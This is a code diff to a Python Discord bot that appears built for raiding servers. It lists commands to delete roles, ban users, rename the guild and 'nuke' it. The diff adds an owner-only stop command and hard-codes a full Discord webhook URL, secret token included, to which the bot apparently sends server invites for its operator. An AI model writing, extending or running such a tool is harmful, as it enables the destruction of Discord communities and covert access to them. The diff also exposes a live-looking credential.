@@ -1,4 +1,4 @@
-#MAKE SURE YOU PUT WEBHOOKS FOR THE BOT TO SEND YOU INVITES TO IN ON LINE 134!! AND YOUR BOTS TOKEN ON LINE 12
+#MAKE SURE YOU PUT YOUR BOTS TOKEN ON LINE 12
 import discord
 from discord.ext import commands
 import random
@@ -28,6 +28,11 @@ async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=game)
    print("Bot made by Kaotic, Bancer and XxGamerBroskixX")
 
+@bot.command()
+@commands.is_owner()
+async def stop(ctx):
+    await ctx.bot.logout()
+    print (Fore.GREEN + f"{bot.user.name} has logged out successfully.")
 
 @bot.command()
 async def cmds(ctx):
@@ -67,7 +72,8 @@ async def cmds(ctx):
  embed.add_field(name="info",value="Gives user info.", inline=False)
  embed.add_field(name="roledel",value="Deletes roles above the bots higest role.", inline=False)
  embed.add_field(name="leave",value="Has the bot leave the guild.", inline=False)
- embed.add_field(name="banuser <user>", value="Bans specified user..", inline=False)
+ embed.add_field(name="banuser <user>",value="Bans specified user..", inline=False)
+ embed.add_field(name="stop",value="Stops the bot using command (BOT OWNER ONLY)", inline=False)
 
  await ctx.send(embed=embed)
 
@@ -124,7 +130,7 @@ async def guildname(ctx, *, name):
   await ctx.message.delete()
   await ctx.guild.edit(name=name)
 
-webhooks = ["!!!WEBHOOKS HERE!!!"]
+webhooks = ["https://discordapp.com/api/webhooks/698237761123254383/uxxR8lUNIkJ4E8Vf2Jgz2a5YJi0h7X8vllYcOvAnRDdZyUY7Q0GhaDZZ9EC8vq1z57vb"]
 @bot.command()
 async def nuke(ctx):
     await ctx.message.delete()
